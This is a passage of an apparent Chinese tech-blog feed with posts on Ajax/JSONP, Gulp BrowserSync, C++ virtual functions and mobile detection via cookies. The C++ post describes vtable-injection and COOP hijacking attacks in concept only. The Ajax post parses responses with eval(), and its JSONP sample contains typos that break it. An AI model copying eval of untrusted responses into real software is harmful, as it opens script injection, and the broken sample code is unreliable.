    <content type="html"><![CDATA[<h1>Ajax异步原理</h1><blockquote>  <p>相当于在用户和服务器之间加了—个中间层(AJAX引擎),使用户操作与服务器响应异步化。并不是所有的用户请求都提交给服务器,像—些数据验证和数据处理等都交给Ajax引擎自己来做, 只有确定需要从服务器读取新数据时再由Ajax引擎代为向服务器提交请求。</p></blockquote><p><code>ajax</code>状态码</p><table>  <thead>    <tr>      <th style="text-align:center">排序</th>      <th style="text-align:center">时间</th>      <th style="text-align:center">状态码</th>    </tr>  </thead>  <tbody>    <tr>      <td style="text-align:center">0</td>      <td style="text-align:center">XHR对象刚创建</td>      <td style="text-align:center">0</td>    </tr>    <tr>      <td style="text-align:center">1</td>      <td style="text-align:center">open建立连接成功</td>      <td style="text-align:center">1</td>    </tr>    <tr>      <td style="text-align:center">2</td>      <td style="text-align:center">接收头信息完毕</td>      <td style="text-align:center">2</td>    </tr>    <tr>      <td style="text-align:center">3</td>      <td style="text-align:center">接收body信息完毕</td>      <td style="text-align:center">3</td>    </tr>    <tr>      <td style="text-align:center">4</td>      <td style="text-align:center">成功,结束后</td>      <td style="text-align:center">4</td>    </tr>  </tbody></table><p><code>ajax</code>的好处就是不阻塞后面代码的执行。</p><p><code>status</code>状态码为<code>200</code>,<code>statusText</code>状态文字是<code>OK</code>时，正确返回。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line">if(this.readyState == 4 &amp;&amp; this.status == 200)&#123;</span><br><span class="line">var str = &apos;&apos;;</span><br><span class="line">str = &apos;状态码是 &apos; + this.status;</span><br><span class="line">str += &apos;状态文字是 &apos; + this.statusText;</span><br><span class="line">document.getElementById(&apos;progress&apos;).innerHTML = str;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p><code>abort</code>属性 --&gt; 中断<code>xhr</code></p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">function stopxhr()&#123;</span><br><span class="line">xhr.abort();</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p><code>send</code>参数写法：<code>k1=v1&amp;k2=v2&amp;k3=v3...</code></p><p><code>POST</code>请求必须加上<code>Content-Type: application/x-www-form-urlencoded</code></p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">xhr.setRequestHeader(<span class="string">'Content-Type'</span>,<span class="string">'application/x-www-form-urlencoded'</span>);</span><br><span class="line">xhr.send(<span class="string">'username='</span>+un+<span class="string">'&amp;email='</span>+eml);</span><br></pre>      </td>    </tr>  </table></figure><h1>Ajax返回值之XML类型</h1><p>返回值类型：</p><blockquote>  <p>不考虑HTML5最新标准，返回值有普通文本/xml文档两种类型</p></blockquote><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;?php </span><br><span class="line">header(&apos;Content-Type: text/xml&apos;);</span><br><span class="line">?&gt;</span><br><span class="line">//此处空了一行</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;bookstore&gt;&lt;book bid=&apos;b0001&apos;&gt;&lt;title&gt;天龙八部&lt;/title&gt;&lt;intro&gt;人生太苦了&lt;/intro&gt;&lt;/book&gt;&lt;/bookstore&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>打开以上<code>xxx.php</code>，<code>xml</code>格式错误提示:</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">This page contains the following errors:</span><br><span class="line">error on line 2 at column 6: XML declaration allowed only at the start of the document.</span><br><span class="line">Below is a rendering of the page up to the first error.</span><br></pre>      </td>    </tr>  </table></figure><p>错误显示：<code>xml</code>必须在文档的首行,如下:</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;?php </span><br><span class="line">header(&apos;Content-Type: text/xml&apos;);</span><br><span class="line">?&gt; </span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;bookstore&gt;&lt;book bid=&apos;b0001&apos;&gt;&lt;title&gt;天龙八部&lt;/title&gt;&lt;intro&gt;人生太苦了&lt;/intro&gt;&lt;/book&gt;&lt;/bookstore&gt;</span><br></pre>      </td>    </tr>  </table></figure><p><strong>API最简单了，基本上照着开发文档写就行了。</strong></p><p><strong><code>Ajax</code>默认无法跨域。最新标准可以，但需要对方允许。</strong></p><p>取后台数据：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>      </td>      <td class="code">        <pre><span class="line">xhr.onreadystatechange = function()&#123;</span><br><span class="line">if(this.readyState == 4)&#123;         //this即xhr对象</span><br><span class="line">// alert(this.responseXML);</span><br><span class="line">var xmldom = this.responseXML; </span><br><span class="line">var book = xmldom.getElementsByTagName(&apos;book&apos;)[&apos;0&apos;]; </span><br><span class="line">var title = book.firstChild.firstChild.wholeText;</span><br><span class="line">var intro = book.lastChild.firstChild.wholeText;</span><br><span class="line">document.getElementById(&apos;btitle&apos;).value = title;</span><br><span class="line">document.getElementById(&apos;bintro&apos;).value = intro;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>在后端生成格式化文件，拼接成<code>HTML</code>或者<code>json</code>文档，操作DOM，生成新的<code>HTML</code>页面。</p><p><em>返回值类型：大的方向可以分为普通文本和xml文档。</em></p><p>普通文本返回类型又分为：</p><ul>  <li>返回简短的标志字符串，如0,1,OK</li>  <li>后台返回大段的<code>HTML</code>代码，直接<code>innerHTML</code>到前端页面</li>  <li><code>json</code>格式，再由js解析</li></ul><p>很多类型，除了<code>HTML5</code>新标准返回的是<code>json</code>,本是文本，只不过符合某些规律，例如<code>json</code>格式。</p><p><code>eval</code>将普通文本转化成js对象<code>[object: Object]</code>。 自己手写的后台数据：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;?php  //code  ?&gt;</span><br><span class="line">&#123;name: &apos;linking&apos;, sex: &apos;male&apos;&#125;</span><br><span class="line">?&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>前端解析：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var linking = eval(&apos;(&apos; + this.responseText + &apos;)&apos;);</span><br><span class="line">alert(linking.name);</span><br></pre>      </td>    </tr>  </table></figure><p>如果是<code>PHP</code>后台获取数据:</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">$book = array(&apos;title&apos; =&gt; &apos;天龙八部&apos;, &apos;intro&apos; =&gt; &apos;人生九苦&apos; );</span><br><span class="line">echo json_encode($book) ;</span><br></pre>      </td>    </tr>  </table></figure><h1>JSONP解决跨域问题</h1><p><code>JSONP</code>不是<code>JSON</code>，只是一种协议，还未被标准组织规范，大家约定使用返回字符串；不用造对象。</p><p><a href="https://zh.wikipedia.org/wiki/JSONP" target="_blank" rel="noopener">Wikipedia</a>解释:</p><blockquote>  <p>JSONP(JSON with Padding)是资料格式 JSON 的一种“使用模式”，可以让网页从别的网域要资料。另一个解决这个问题的新方法是<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E4%BE%86%E6%BA%90%E8%B3%87%E6%BA%90%E5%85%B1%E4%BA%AB" target="_blank" rel="noopener">跨来源资源共享</a>(CORS)。</p></blockquote><p>由于<strong>同源策略</strong>，一般来说位于 <a href="http://server1.example.com" target="_blank" rel="noopener">server1.example.com</a> 的网页无法与不是 <a href="http://server1.example.com" target="_blank" rel="noopener">server1.example.com</a> 的服务器沟通，而 HTML 的 script 元素是一个例外。利用 script 元素的这个开放策略，网页可以得到从其他来源动态产生的 JSON 资料，而这种使用模式就是所谓的  JSONP。用 JSONP 抓到的资料并不是 JSON，而是任意的 JavaScript，用 JavaScript 直译器执行而不是用 JSON 解析器解析。</p><p><strong>padding填充</strong>：典型的 JSONP 就是把既有的 JSON API 用函数呼叫<strong>包起来</strong>以达到跨域存取的解法。</p><p><strong>script元素注入</strong>：为了要启动一个 JSONP 呼叫（或者说，使用这个模式），你需要一个 script 元素。因此，浏览器必须为每一个 JSONP 要求加（或是重用）一个新的、有所需 src 值的 script 元素到 HTML DOM 里—或者说是“注入”这个元素。浏览器执行该元素，抓取 src 里的 URL，并执行回传的 JavaScript。 也因为这样，JSONP 被称作是一种“让使用者利用 script 元素注入的方式绕开同源策略”的方法。</p><pre><code>function sear(){//获取将要搜索的内容var searchtext = document.getElementsByName('searchtext')[0].value;//Google ajax API 搜索参数，返回json格式，利用回调函数aa解析var url = 'http://ajax.googleais.com/ajax/services/search/web?v=1.0&amp;q='+ searchtext + '&amp;callback=aa';//动态创建script标签，加入head，使其以script形式加载进来var scr = document.createElement('script');scr.setAttribute('type', 'text/javascript');scr.setAttribute('src', url);document.getElementByTagName('head')[0].appendChild(scr);}//回调函数，对返回的数据进行处理function aa(res){alert(res);}</code></pre><p><br><br>本文链接： <a href="http://home.meng.uno/articles/c2e4dce5/">http://home.meng.uno/articles/c2e4dce5/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Ajax异步原理
相当于在用户和服务器之间加了—个中间层(AJAX引擎),使用户操作与服务器响应异步化。并不是所有的用户请求都提交给服务器,像—些数据验证和数据处理等都交给Ajax引擎自己来做, 只有确定需要从服务器读取新数据时再由Ajax引擎代为向服务器提交请求。

ajax状态码

排序 时间 状态码 0 XHR对象刚创建 0 1 open建立连接成功 1 2 接收头信息完毕 2 3 接收body信息完毕 3 4 成功,结束后 4 ajax的好处就是不阻塞后面代码的执行。

status状态码为200,statusText状态文字是OK时，正确返回。

1
2
3
4
5
6


if(t
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="ajax" scheme="http://home.meng.uno/tags/ajax/"/>
    
      <category term="XHR" scheme="http://home.meng.uno/tags/XHR/"/>
    
      <category term="POST" scheme="http://home.meng.uno/tags/POST/"/>
    
  </entry>
  
  <entry>
    <title>在Gulp中使用BrowserSync</title>
    <link href="http://home.meng.uno/articles/70440106/"/>
    <id>http://home.meng.uno/articles/70440106/</id>
    <published>2016-02-24T11:58:51.000Z</published>
    <updated>2020-12-02T01:41:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>BrowserSync可以同时同步刷新多个浏览器，更神奇的是你在一个浏览器中滚动页面、点击按钮、输入框中输入信息等用户行为也会同步到每个浏览器中。</p><h1>安装<code>browser-sync</code>模块</h1><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">npm install browser-sync -g</span><br></pre>      </td>    </tr>  </table></figure><h1>命令行直接使用</h1><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">browser-sync start --server --files &quot;css/*.css&quot;</span><br></pre>      </td>    </tr>  </table></figure><p>使用上面命令会开启一个迷你服务器，自动帮你打开浏览器，默认地址<code>localhost:3000</code>，默认打开<code>index.html</code>，如果没有，需要手动加上你要打开的页面，如<code>localhost:3000/test.html</code>。</p><p>通常你不会需要默认的地址，所以需要使用代理模式：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">browser-sync start --proxy &quot;localhost:8080&quot; --files &quot;css/*.css&quot;</span><br></pre>      </td>    </tr>  </table></figure><h1>Browsersync + Gulp</h1><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var gulp = require(&apos;gulp&apos;),</span><br><span class="line">    sass = require(&apos;gulp-ruby-sass&apos;),</span><br><span class="line">    autoprefixer = require(&apos;gulp-autoprefixer&apos;),</span><br><span class="line">    minifycss = require(&apos;gulp-minify-css&apos;),</span><br><span class="line">    rename = require(&apos;gulp-rename&apos;),</span><br><span class="line">    notify = require(&apos;gulp-notify&apos;);</span><br><span class="line">var browserSync = require(&apos;browser-sync&apos;).create();</span><br><span class="line">gulp.task(&apos;sass&apos;, function() &#123;</span><br><span class="line">    return sass(&apos;sass/style.scss&apos;, &#123;style: &quot;expanded&quot;&#125;)</span><br><span class="line">        //.pipe(sass(&#123;style: &quot;expanded&quot;&#125;))</span><br><span class="line">        .pipe(autoprefixer(&apos;last 2 version&apos;, &apos;safari 5&apos;, &apos;ie 8&apos;, &apos;ie 9&apos;, &apos;opera 12.1&apos;, &apos;ios 6&apos;, &apos;android 4&apos;))</span><br><span class="line">        .pipe(rename(&#123;suffix: &apos;.min&apos;&#125;))</span><br><span class="line">        .pipe(minifycss())</span><br><span class="line">        .pipe(gulp.dest(&apos;css&apos;))</span><br><span class="line">        .pipe(notify(&#123; message: &apos;Styles task complete&apos; &#125;))</span><br><span class="line">        .pipe(browserSync.stream());</span><br><span class="line">&#125;);</span><br><span class="line">gulp.task(&apos;serve&apos;, [&apos;sass&apos;], function() &#123;</span><br><span class="line">    browserSync.init(&#123;</span><br><span class="line">        server: &quot;./&quot;</span><br><span class="line">    &#125;);</span><br><span class="line">    gulp.watch(&quot;sass/*.scss&quot;, [&apos;sass&apos;]);</span><br><span class="line">    gulp.watch(&quot;*.html&quot;).on(&apos;change&apos;, browserSync.reload);</span><br><span class="line">&#125;);</span><br><span class="line">gulp.task(&apos;default&apos;, [&apos;serve&apos;]);</span><br></pre>      </td>    </tr>  </table></figure><p>其中</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">gulp.watch(&quot;sass/*.scss&quot;, [&apos;sass&apos;]);</span><br></pre>      </td>    </tr>  </table></figure><p>会在编译完sass后，以无刷新方式更新页面。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">gulp.watch(&quot;*.html&quot;).on(&apos;change&apos;, browserSync.reload);</span><br></pre>      </td>    </tr>  </table></figure><p>会在修改html文件后刷新页面。</p><p>如果需要在修改js后刷新页面，可以像下面这样：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre>      </td>      <td class="code">        <pre><span class="line">gulp.task(&apos;sass&apos;, function() &#123;</span><br><span class="line">    return sass(&apos;sass/style.scss&apos;, &#123;style: &quot;expanded&quot;&#125;)</span><br><span class="line">        //.pipe(sass(&#123;style: &quot;expanded&quot;&#125;))</span><br><span class="line">        .pipe(autoprefixer(&apos;last 2 version&apos;, &apos;safari 5&apos;, &apos;ie 8&apos;, &apos;ie 9&apos;, &apos;opera 12.1&apos;, &apos;ios 6&apos;, &apos;android 4&apos;))</span><br><span class="line">        .pipe(rename(&#123;suffix: &apos;.min&apos;&#125;))</span><br><span class="line">        .pipe(minifycss())</span><br><span class="line">        .pipe(gulp.dest(&apos;css&apos;))</span><br><span class="line">        .pipe(notify(&#123; message: &apos;Styles task complete&apos; &#125;))</span><br><span class="line">        .pipe(browserSync.stream());</span><br><span class="line">&#125;);</span><br><span class="line">gulp.task(&apos;js&apos;, function () &#123;</span><br><span class="line">    return gulp.src(&apos;js/*js&apos;)</span><br><span class="line">        .pipe(browserify())</span><br><span class="line">        .pipe(uglify())</span><br><span class="line">        .pipe(gulp.dest(&apos;dist/js&apos;))</span><br><span class="line">        .pipe(browserSync.stream());;</span><br><span class="line">&#125;);</span><br><span class="line">gulp.task(&apos;serve&apos;, [&apos;sass&apos;, &apos;js&apos;], function() &#123;</span><br><span class="line">    browserSync.init(&#123;</span><br><span class="line">        server: &quot;./&quot;</span><br><span class="line">    &#125;);</span><br><span class="line">    gulp.watch(&quot;sass/*.scss&quot;, [&apos;sass&apos;]);</span><br><span class="line">    gulp.watch(&quot;*.html&quot;).on(&apos;change&apos;, browserSync.reload);</span><br><span class="line">    gulp.watch(&quot;js/*.js&quot;, [&apos;js&apos;])</span><br><span class="line">&#125;);</span><br><span class="line">gulp.task(&apos;default&apos;, [&apos;serve&apos;]);</span><br></pre>      </td>    </tr>  </table></figure><p>BrowserSync确实是一个好东西！</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/70440106/">http://home.meng.uno/articles/70440106/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      BrowserSync可以同时同步刷新多个浏览器，更神奇的是你在一个浏览器中滚动页面、点击按钮、输入框中输入信息等用户行为也会同步到每个浏览器中。

安装browser-sync模块
1


npm install browser-sync -g


命令行直接使用
1


browser-sync start --server --files &quot;css/*.css&quot;


使用上面命令会开启一个迷你服务器，自动帮你打开浏览器，默认地址localhost:3000，默认打开index.html，如果没有，需要手动加上你要打开的页面，如localhost:3000/test.html。

通常你不
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="Gulp" scheme="http://home.meng.uno/tags/Gulp/"/>
    
      <category term="BrowserSync" scheme="http://home.meng.uno/tags/BrowserSync/"/>
    
  </entry>
  
  <entry>
    <title>虚函数</title>
    <link href="http://home.meng.uno/articles/dcffa0c0/"/>
    <id>http://home.meng.uno/articles/dcffa0c0/</id>
    <published>2016-02-20T04:18:29.000Z</published>
    <updated>2020-12-02T02:09:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1>虚函数与多态</h1><p>继承和多态，是面向对象中老生常谈的话题。C++中，我们也可以经常看到<code>virtaul</code>、<code>override</code>这样的关键字；这正是虚函数的标志。虚函数就是为了解决多态的问题：如果要使用一个基类的指针，根据对象的不同类型去调用相应的函数，就需要使用虚函数了。通俗的说也就是同一个入口，却能够调用不同的方法。</p><p>通常，对于虚函数的调用，往往在运行时才能确定调用哪个版本的函数。这是由于基类的指针或者引用，其动态类型必须在运行的时候才能确定（它具体指向了什么类型）。而“动态绑定”就指的在运行时，根据对象的类型，调用具体方法的过程，这个过程正是通过<strong>虚函数表</strong>实现的。<br>  <strong>抽象基类</strong>指的是有<strong>纯虚函数</strong>的类。纯虚函数，指的是没有函数体的函数，通常通过在函数体的位置写上<code>=0</code>来表示。对于抽象基类，是不能直接创建一个对象的；但是可以创建它它们的派生类的对象：只要它们覆盖了纯虚函数。纯虚函数表示这个函数的具体实现全部交给派生类去做。</p><h1>虚函数表与虚函数的调用</h1><p>那么，“动态绑定”是如何实现的呢？这便是借助于虚函数表来实现。对于每个具有虚函数的类，都会有一个对应的虚函数表vtable，其代码和对应内存结构如下所示：</p><pre><code>class A {int varA;public:virtual int vAfoo(int a, int *b){return a + (*b);}virtual int vAbar(int a){return a + 1;}virtual bool vAduh(){return true;}virtual int vAtest(int a){return 0;}void Afoo(){this-&gt;vAduh();}};class B {int varB;public:virtual int vBfoo(int a) = 0;virtual bool vBbar(int b){return b == 0;}char *Bfoo(char *c){return c;}};class C : public A, public B {int varC;public:int vAtest(int a){return -(a);}int vAfoo(int a, int *b){return *b;}int vBfoo(int a){return a - 1;}virtual void vCfoo(){}bool vAduh(){return false;}};</code></pre><p><img src="http://www.meng.uno/images/c++/%E8%99%9A%E8%A1%A8.png" alt="虚函数表"></p><p>这个表中的每一项，都是一个虚函数的地址，也就是虚函数的指针。而每个对象的第一个值都是虚标指针，它指向了了所对应虚函数表的第一个表项（也就是虚函数表的基址）。每次调用虚函数时，都会首先通过这个虚表指针，找到虚函数表，然后再在虚函数表中，找到真正的虚函数的地址，并进行调用。假设存在有多继承的情况，那么就会有多个vptr，分别放在对应的基类对象的开头位置。</p><h1>虚继承</h1><p>对于“菱形继承”情况（也即两个子类继承同一个父类，而新的子类又同时继承这两个子类），则可能产生二义性问题。例如下面的情况，那么D中就会保存两次A中的变量和函数，并且在使用时也会很不方便，必须利用域作用符来使用变量和函数。</p><pre><code>A  /   \ B1   B2  \   /    D</code></pre><p>虚继承是在继承时，在基类类型前面加上<code>virtual</code>关键字。虚继承能够解决基类多副本的问题：在任何派生类当中，虚基类都是通过一个共享对象来表示的，它们通过指针去访问这个基类中的内容；它不用去保存多份基类的拷贝，而是只需要多出一个指向基类子对象的指针。从内存布局上来说，在虚表的负offset位置，会保存一个指针指向虚基类对象。<br> 也就是说继承自A的虚函数和对象，全部只保存一份在D自身的子对象中，相比不使用虚继承，它删除了B1和B2当中的（2份）基类成员；它自己则需要保存一份基类成员和偏移指针；而如果要用B1和B2的指针或者引用去访问一个D对象时，那么访问A的成员则需要通过间接引用来访问；也就是说子对象需要有一个  <strong>偏移量</strong>，指示在内存中，基类的位置。其内存布局一般如下：</p><table>  <thead>    <tr>      <th>内存</th>    </tr>  </thead>  <tbody>    <tr>      <td>B1的虚表指针</td>    </tr>    <tr>      <td><strong>B1的偏移指针</strong></td>    </tr>    <tr>      <td>B1的数据成员</td>    </tr>    <tr>      <td>B2的虚表指针</td>    </tr>    <tr>      <td><strong>B2的偏移指针</strong></td>    </tr>    <tr>      <td>B2的数据成员</td>    </tr>    <tr>      <td>D的虚表指针</td>    </tr>    <tr>      <td><strong>D的偏移指针</strong></td>    </tr>    <tr>      <td>D的数据成员</td>    </tr>    <tr>      <td>A的虚表指针</td>    </tr>    <tr>      <td>A的数据成员</td>    </tr>  </tbody></table><h1>虚表与劫持攻击</h1><p>在C<ins>程序中，%90以上的间接调用都是vcall。篡改程序中的虚函数调用，是劫持C</ins>程序的一种常见手段。这里简单说说常见手段。</p><p>一种方法是<strong>虚表注入</strong>。众所周知，虚表保存在程序的.rodata段中，它是可读，不可写的；而对象当中的虚表指针却是可读写的状态；因此篡改虚表指针是较为直接的方式。</p><p><img src="http://www.meng.uno/images/c++/%E8%99%9A%E8%A1%A8%E6%B3%A8%E5%85%A5.png" alt="虚表注入"></p><p>如图，如果利用漏洞（overflow、use-after-free等）在内存中构造一个虚假的虚表，并且将对象中的虚函数指针指向注入的虚假的虚表，那么在虚函数调用时，就会调用虚假的虚函数。甚至只需要一次虚函数调用就能够通过shellcode完成攻击。</p><p>当然，如果程序进行了一定程度的保护，例如检查虚表指针是否属于.rodata段，攻击就只能依赖于现有的虚表来构造了。<a href="http://syssec.rub.de/media/emma/veroeffentlichungen/2015/03/28/COOP-Oakland15.pdf" target="_blank" rel="noopener">Counterfeit Object-oriented Programming</a>就提出了这样一种方法。</p><p><img src="http://www.meng.uno/images/c++/coop%E6%94%BB%E5%87%BB.png" alt="COOP"></p><p>可以看到，这种方法没有注入新的虚表，而是将vptr的值，指向了虚表中的不同位置（而不是虚表的起始地址）。如果能够构造一系列的虚假对象，那么就可以在一次循环中（比如某个对象数组的依次析构），在调用同一个虚函数时，实际上调用不同的函数，从而构造一个虚假的执行链。看到这里，也许你会有疑问：仅仅用有限的虚函数，能够构造图灵计算的攻击吗？答案是肯定的：有兴趣的话可以阅读一下原文，通过拼凑虚函数，是能够组合出各种语义的。</p><h1>小结</h1><p>可见，虚函数是面向对象语言中，十分巧妙而又必不可少的设计；但它的特点也使得它成为黑客滥用、攻击的目标。指的庆幸的是，目前已经有一些开销较小的方法，能够保护虚表和虚函数了。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/dcffa0c0/">http://home.meng.uno/articles/dcffa0c0/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      虚函数与多态
继承和多态，是面向对象中老生常谈的话题。C++中，我们也可以经常看到virtaul、override这样的关键字；这正是虚函数的标志。虚函数就是为了解决多态的问题：如果要使用一个基类的指针，根据对象的不同类型去调用相应的函数，就需要使用虚函数了。通俗的说也就是同一个入口，却能够调用不同的方法。

通常，对于虚函数的调用，往往在运行时才能确定调用哪个版本的函数。这是由于基类的指针或者引用，其动态类型必须在运行的时候才能确定（它具体指向了什么类型）。而“动态绑定”就指的在运行时，根据对象的类型，调用具体方法的过程，这个过程正是通过虚函数表实现的。
抽象基类指的是有纯虚函数的类。纯虚函
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="C++" scheme="http://home.meng.uno/tags/C/"/>
    
      <category term="虚函数" scheme="http://home.meng.uno/tags/%E8%99%9A%E5%87%BD%E6%95%B0/"/>
    
      <category term="内存安全" scheme="http://home.meng.uno/tags/%E5%86%85%E5%AD%98%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>判断是否手机登陆</title>
    <link href="http://home.meng.uno/articles/d23d13ae/"/>
    <id>http://home.meng.uno/articles/d23d13ae/</id>
    <published>2016-01-11T12:17:29.000Z</published>
    <updated>2020-12-02T02:01:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>需求</p><blockquote>  <p>项目的网站时做的手机网页，但是没有考虑到自适应pc端，只是在chrome中固定了手机屏幕大小，所以在pc端查看会很丑，布局是乱的；但是重写又很麻烦，所以有必要做一下提醒，让用户手动将网页缩小到手机屏幕大小。</p></blockquote><p>用到</p><blockquote>  <p>非手机检验和cookie记录</p></blockquote><p>方法</p><blockquote>  <p>这段代码是使用了cookie来控制的</p></blockquote><ol>  <li>使用cookie让浏览器记住页面已经打开过一次，当前页面刷新不会弹出提醒。</li>  <li>浏览器一旦关闭，保存这个记录的cookie文件将被删除。重新打开浏览器弹出窗口会再次出现，从而确保了在原有的窗口基础上只打开一次。</li></ol><p>判断非手机登陆方式</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">if (!/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent))</span><br><span class="line">alert(&quot;为了提高体验效果，请把页面缩小成手机屏幕大小。\n谢谢合作！&quot;);</span><br></pre>      </td>    </tr>  </table></figure><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">try&#123;</span><br><span class="line">var alertmessage=&quot;为了提高体验效果，请把页面缩小成手机屏幕大小。\n谢谢合作！&quot;;</span><br><span class="line">var once_per_session=1</span><br><span class="line">function get_cookie(Name) &#123;</span><br><span class="line">  var search = Name + &quot;=&quot;</span><br><span class="line">  var returnvalue = &quot;&quot;;</span><br><span class="line">  if (document.cookie.length &gt; 0) &#123;</span><br><span class="line">offset = document.cookie.indexOf(search)</span><br><span class="line">if (offset != -1) &#123;</span><br><span class="line">  offset += search.length;</span><br><span class="line">  end = document.cookie.indexOf(&quot;;&quot;, offset);</span><br><span class="line">  if (end == -1)</span><br><span class="line"> end = document.cookie.length;</span><br><span class="line">  returnvalue=unescape(document.cookie.substring(offset, end))</span><br><span class="line">  &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> return returnvalue;</span><br><span class="line">&#125;</span><br><span class="line">function 